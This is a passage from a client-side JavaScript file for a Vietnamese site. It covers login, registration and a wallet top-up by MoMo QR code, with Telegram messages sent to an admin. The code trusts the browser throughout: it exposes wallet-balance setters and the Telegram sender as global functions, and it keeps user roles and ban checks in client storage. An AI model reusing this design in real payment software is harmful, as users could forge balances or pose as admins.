    // ========================================
    // WALLET PAYMENT
    // ========================================
    function handleWalletPayment() {
        const user = getCurrentUser();
        if (!user) {
            showToast('⚠️ Vui lòng đăng nhập!', 'error');
            return;
        }

        if (!user.id) {
            const users = getUsers();
            let foundId = null;
            for (const id in users) {
                if (users[id].username === user.username || users[id].email === user.email) {
                    foundId = id;
                    break;
                }
            }
            if (foundId) {
                user.id = foundId;
                saveCurrentUser(user);
            } else {
                showToast('⚠️ Lỗi: Vui lòng đăng nhập lại!', 'error');
                logout();
                return;
            }
        }

        const users = getUsers();
        if (users[user.id] && users[user.id].banned) {
            showToast('🚫 Tài khoản đã bị khóa!', 'error');
            return;
        }

        const amount = parseInt(walletAmount.value);
        if (!amount || amount < 10000) {
            showToast('⚠️ Số tiền tối thiểu 10,000đ!', 'error');
            return;
        }

        if (amount > 5000000) {
            showToast('⚠️ Số tiền tối đa 5,000,000đ!', 'error');
            return;
        }

        const txId = 'WALLET_' + Date.now().toString(36).toUpperCase() + '_' + Math.random().toString(36).substring(2, 6).toUpperCase();
        
        pendingWalletTx.id = txId;
        pendingWalletTx.amount = amount;
        pendingWalletTx.userId = user.id;
        pendingWalletTx.timestamp = Date.now();
        
        const txData = {
            userId: user.id,
            username: user.username,
            displayName: user.displayName || user.username || 'Unknown',
            email: user.email || 'unknown',
            amount: amount,
            status: 'pending',
            time: new Date().toISOString()
        };
        saveWalletTransaction(txId, txData);
        
        console.log('✅ Tạo transaction:', txId, 'cho user:', user.id);
        
        const qrModal = document.getElementById('qrModal');
        const qrImage = document.getElementById('qrImage');
        const qrAmount = document.getElementById('qrAmount');
        const qrPhone = document.getElementById('qrPhone');
        const qrContent = document.getElementById('qrContent');
        const transactionDisplay = document.getElementById('transactionDisplay');
        const walletTxStatus = document.getElementById('walletTxStatus');
        
        const displayText = `NAPW ${txId}`;
        if (transactionDisplay) transactionDisplay.textContent = displayText;
        if (qrContent) qrContent.textContent = displayText;
        
        const momoQR = `https://img.vietqr.io/image/momo-0868687049-compact2.png?amount=${amount}&addInfo=${encodeURIComponent(displayText)}`;
        
        if (qrImage) qrImage.src = momoQR;
        if (qrAmount) qrAmount.textContent = formatCurrency(amount);
        if (qrPhone) qrPhone.textContent = '0868687049';
        
        if (walletTxStatus) {
            walletTxStatus.style.display = 'block';
            walletTxStatus.className = 'status-pending';
            walletTxStatus.textContent = '⏳ Đang chờ xác nhận...';
        }
        
        if (qrModal) {
            $(qrModal).modal('show');
            $(qrModal).data('type', 'wallet');
        }
    }

    // ========================================
    // CONFIRM WALLET PAYMENT
    // ========================================
    function confirmWalletPayment() {
        let txId = pendingWalletTx.id;
        let amount = pendingWalletTx.amount;
        let userId = pendingWalletTx.userId;
        
        if (!txId || !amount || !userId) {
            const transactions = getWalletTransactions();
            const currentUser = getCurrentUser();
            
            if (currentUser) {
                for (const id in transactions) {
                    const tx = transactions[id];
                    if ((tx.status === 'pending' || tx.status === 'confirmed_by_user') && tx.userId === currentUser.id) {
                        txId = id;
                        amount = tx.amount;
                        userId = tx.userId;
                        break;
                    }
                }
            }
        }
        
        if (!txId || !amount || !userId) {
            showToast('⚠️ Không tìm thấy giao dịch!', 'error');
            return;
        }
        
        const txData = getWalletTransaction(txId);
        if (!txData) {
            showToast('⚠️ Giao dịch không tồn tại!', 'error');
            return;
        }
        
        if (!txData.userId) {
            txData.userId = userId;
            saveWalletTransaction(txId, txData);
        }
        
        if (txData.status === 'completed') {
            showToast('⚠️ Giao dịch đã hoàn thành!', 'error');
            return;
        }
        
        if (txData.status === 'confirmed_by_user') {
            showToast('ℹ️ Bạn đã xác nhận rồi! Chờ admin duyệt.', 'info');
            return;
        }
        
        const user = getCurrentUser();
        if (!user || user.id !== userId) {
            showToast('⚠️ Lỗi xác thực!', 'error');
            return;
        }

        txData.status = 'confirmed_by_user';
        txData.confirmedAt = new Date().toISOString();
        saveWalletTransaction(txId, txData);
        
        const adminMessage = `
🔔 *XÁC NHẬN NẠP VÍ*\n
📋 Mã: ${txId}
👤 User: ${user.displayName || user.username}
💵 Số tiền: ${formatCurrency(amount)}
🕐 Thời gian: ${new Date().toLocaleString('vi-VN')}
📌 Lệnh duyệt: /duyetvi ${txId}
        `;
        sendTelegramMessage(adminMessage);
        
        showToast('✅ Đã gửi xác nhận! Chờ admin duyệt.', 'success');
        
        const walletTxStatus = document.getElementById('walletTxStatus');
        if (walletTxStatus) {
            walletTxStatus.className = 'status-pending';
            walletTxStatus.textContent = '⏳ Đã xác nhận, đang chờ admin duyệt...';
        }
        
        const confirmBtn = document.getElementById('confirmPaymentBtn');
        if (confirmBtn) {
            confirmBtn.innerHTML = '<i class="fas fa-check-circle"></i> Đã gửi xác nhận';
            confirmBtn.disabled = true;
        }
        
        pendingWalletTx.id = null;
        pendingWalletTx.amount = null;
        pendingWalletTx.userId = null;
        pendingWalletTx.timestamp = null;
        
        if (walletAmount) walletAmount.value = '';
        document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('active'));
        
        setTimeout(() => {
            $('#qrModal').modal('hide');
            $('#walletModal').modal('hide');
        }, 3000);
    }

    // ========================================
    // EXPOSE FUNCTIONS
    // ========================================
    window.isAdmin = function() {
        const user = getCurrentUser();
        return user && user.role === 'admin';
    };

    window.getCurrentUser = getCurrentUser;
    window.isLoggedIn = function() {
        return !!getCurrentUser();
    };
    
    window.getWalletBalance = getWalletBalance;
    window.deductWalletBalance = deductWalletBalance;
    window.addWalletBalance = addWalletBalance;
    window.updateWalletUI = updateWalletUI;
    window.handleWalletPayment = handleWalletPayment;
    window.confirmWalletPayment = confirmWalletPayment;
    window.setWalletBalance = setWalletBalance;
    window.sendTelegramMessage = sendTelegramMessage;

    // ========================================
    // EVENT LISTENERS
    // ========================================
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('loginUsername').value.trim();
            const password = document.getElementById('loginPassword').value;
            
            if (!username || !password) {
                showToast('⚠️ Vui lòng nhập đầy đủ!', 'error');
                return;
            }
            
            if (login(username, password)) {
                $('#loginModal').modal('hide');
                loginForm.reset();
            }
        });
    }

    if (registerForm) {
        registerForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const displayName = document.getElementById('regDisplayName').value.trim();
            const email = document.getElementById('regEmail').value.trim();
            const password = document.getElementById('regPassword').value;
            const confirmPassword = document.getElementById('regConfirmPassword').value;
            
            if (!displayName || !email || !password || !confirmPassword) {
                showToast('⚠️ Vui lòng nhập đầy đủ!', 'error');
                return;
            }
            
            if (password.length < 6) {
                showToast('⚠️ Mật khẩu tối thiểu 6 ký tự!', 'error');
                return;
            }
            
            if (password !== confirmPassword) {
                showToast('⚠️ Mật khẩu không khớp!', 'error');
                return;
            }
            
            if (!email.includes('@') || !email.includes('.')) {
                showToast('⚠️ Email không hợp lệ!', 'error');
                return;
            }
            
            if (register(displayName, email, password)) {
                $('#registerModal').modal('hide');
                registerForm.reset();
            }
        });
    }

    if (logoutBtn) {
        logoutBtn.addEventListener('click', function() {
            logout();
        });
    }

    if (walletPaymentBtn) {
        walletPaymentBtn.addEventListener('click', function(e) {
            e.preventDefault();
            handleWalletPayment();
        });
    }

    const showWalletBtn = document.getElementById('showWalletBtn');
    if (showWalletBtn) {
        showWalletBtn.addEventListener('click', function(e) {
            e.preventDefault();
            const user = getCurrentUser();
            if (!user) {
                showToast('⚠️ Vui lòng đăng nhập!', 'error');
                return;
            }
            
            const users = getUsers();
            if (users[user.id] && users[user.id].banned) {
                showToast('🚫 Tài khoản đã bị khóa!', 'error');
                return;
            }
            
            if (walletBalanceDisplay) {
                walletBalanceDisplay.textContent = formatCurrency(user.wallet || 0);
            }
            
            if (walletAmount) walletAmount.value = '';
            document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('active'));
            
            if (walletModal) {
                $(walletModal).modal('show');
            }
        });
    }

    document.querySelectorAll('.preset-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const amount = parseInt(this.dataset.amount);
            if (walletAmount) walletAmount.value = amount;
            document.querySelectorAll('.preset-btn').forEach(b => b.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
    if (confirmPaymentBtn) {
        confirmPaymentBtn.addEventListener('click', function() {
            const isWalletPayment = pendingWalletTx.id !== null && pendingWalletTx.id !== undefined;
            if (isWalletPayment) {
                confirmWalletPayment();
            } else {
                const transactions = getWalletTransactions();
                const currentUser = getCurrentUser();
                let found = false;
                if (currentUser) {
                    for (const id in transactions) {
                        const tx = transactions[id];
                        if (tx.status === 'pending' && tx.userId === currentUser.id) {
                            found = true;
                            pendingWalletTx.id = id;
                            pendingWalletTx.amount = tx.amount;
                            pendingWalletTx.userId = tx.userId;
                            break;
                        }
                    }
                }
                if (found) {
                    confirmWalletPayment();
                } else {
                    const event = new CustomEvent('confirmGamePayment');
                    document.dispatchEvent(event);
                }
            }
        });
    }

    const copyTransactionBtn = document.getElementById('copyTransactionBtn');
    if (copyTransactionBtn) {
        copyTransactionBtn.addEventListener('click', function() {
            const text = document.getElementById('transactionDisplay')?.textContent || '';
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text).then(() => showToast('Đã sao chép mã!'));
            } else {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
                showToast('Đã sao chép mã!');
            }
        });
    }

    document.getElementById('logoutBannedBtn')?.addEventListener('click', function() {
        if (bannedOverlay) bannedOverlay.style.display = 'none';
        if (loginOverlay) loginOverlay.style.display = 'flex';
        localStorage.removeItem(AUTH_KEY);
        updateUI();
        document.dispatchEvent(new CustomEvent('logoutSuccess'));
    });

    // ========================================
    // CHECK USER BANNED
    // ========================================
    setInterval(checkUserBanned, 5000);

    // ========================================
    // INIT
    // ========================================
    updateUI();
    setupTelegramWebhook();

    console.log('✅ Auth.js đã sẵn sàng!');
    console.log('📝 Pending transaction:', pendingWalletTx);

})();